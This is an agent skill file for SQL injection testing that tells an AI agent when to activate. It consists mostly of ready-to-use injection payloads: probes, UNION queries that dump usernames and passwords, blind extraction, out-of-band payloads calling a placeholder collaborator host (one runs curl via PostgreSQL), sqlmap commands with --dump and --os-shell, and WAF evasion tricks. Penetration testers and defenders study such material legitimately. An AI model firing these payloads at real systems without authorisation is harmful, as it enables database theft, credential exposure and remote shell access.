---
name: sqli-testing
description: Detect and exploit SQL injection vulnerabilities in web application parameters
origin: RedteamOpencode
---

# SQL Injection Testing

## When to Activate

- Parameter may reach a DB query (search, login, filter, sort, ID lookup)
- Error messages reveal SQL backend, numeric/string params in URLs/POST/cookies/headers

## Detection

### 1. Initial Probing
```
# String: '  ''  ' OR '1'='1  ' OR '1'='2  " OR "1"="1
# Numeric: 1 OR 1=1  1 OR 1=2  1 AND 1=1  1 AND 1=2
# Comment: ' --  ' #  ') OR ('1'='1
```

### 2. Boolean-Based
```
?id=1 AND 1=1    # True — normal content
?id=1 AND 1=2    # False — different content
?id=1' AND '1'='1  /  ?id=1' AND '1'='2
```

### 3. Time-Based
```
' OR SLEEP(5)--                              # MySQL
'; SELECT pg_sleep(5)--                      # PostgreSQL
'; WAITFOR DELAY '0:0:5'--                   # MSSQL
```

### 4. Error-Based
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--    # MySQL
' AND 1=CAST((SELECT version()) AS int)--                  # PostgreSQL
' AND 1=CONVERT(int,(SELECT @@version))--                  # MSSQL
```

## Database Identification

| DB | Error Pattern |
|----|---------------|
| MySQL | `You have an error in your SQL syntax`, `MariaDB` |
| PostgreSQL | `unterminated quoted string`, `PSQLException` |
| MSSQL | `Unclosed quotation mark`, `Microsoft SQL` |
| SQLite | `SQLITE_ERROR`, `unrecognized token` |
| Oracle | `ORA-`, `quoted string not properly terminated` |

Version: `SELECT version()` (MySQL/PG), `SELECT @@version` (MySQL/MSSQL), `SELECT sqlite_version()` (SQLite)

## Exploitation

### UNION-Based
```
' ORDER BY 1--  ' ORDER BY 2--  ...  # Find column count (increment until error)
' UNION SELECT NULL,NULL,NULL--       # Match column count
' UNION SELECT NULL,'a',NULL--        # Find displayable columns
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

### Blind Boolean
```
' AND SUBSTRING(version(),1,1)='5'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
```

### Blind Time
```
' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(3),0)--                          # MySQL
' AND CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END--  # PG
```

### Out-of-Band
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.COLLAB_DOMAIN\\a'))--      # MySQL
'; EXEC master..xp_dirtree '\\COLLAB_DOMAIN\a'--                             # MSSQL
'; COPY (SELECT version()) TO PROGRAM 'curl http://COLLAB_DOMAIN/'--          # PG
```

## sqlmap
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs --level 3 --risk 2
sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --dbs
sqlmap -u "http://target/page?id=1" --cookie="session=abc" --batch --dbs
sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
sqlmap -r request.txt --batch --dbs --level 3 --risk 2
sqlmap -u "http://target/page?id=1" --os-shell --batch
```

## WAF Bypass
```
%27%20OR%20%271%27%3D%271                    # URL encoding
' uNiOn SeLeCt NULL,version(),NULL--         # Case alternation
UN/**/ION SE/**/LECT NULL,version(),NULL--   # Comment insertion
/*!50000UNION*/ /*!50000SELECT*/             # MySQL inline comments
'%09OR%091=1--                               # Whitespace alternatives
sqlmap -u "URL" --tamper=between,randomcase,space2comment --batch --dbs
```
